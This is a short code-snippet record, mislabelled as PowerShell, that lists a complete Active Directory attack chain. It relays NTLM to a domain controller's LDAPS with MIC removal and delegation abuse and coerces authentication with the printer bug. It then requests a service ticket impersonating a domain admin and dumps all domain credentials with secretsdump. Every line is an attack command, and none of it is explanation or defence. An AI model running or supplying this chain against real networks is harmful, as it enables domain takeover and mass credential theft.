---
id: 28fad63d-cfd8-463c-82c7-fc7a281725c2
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:05.532864+00:00'
updated_at: '2023-04-10T20:26:36.998317+00:00'
---

# Code Snippet 28fad63d

**Language**: Powershell

```powershell
# create a new machine account
TERM1> ntlmrelayx.py -t ldaps://rlt-dc.relaytest.local --remove-mic --delegate-access -smb2support 
TERM2> python printerbug.py relaytest.local/username@second-dc-server 10.0.2.6
TERM1> getST.py -spn host/second-dc-server.local 'relaytest.local/MACHINE$:PASSWORD' -impersonate DOMAIN_ADMIN_USER_NAME

# connect using the ticket
export KRB5CCNAME=DOMAIN_ADMIN_USER_NAME.ccache
secretsdump.py -k -no-pass second-dc-server.local -just-dc
```


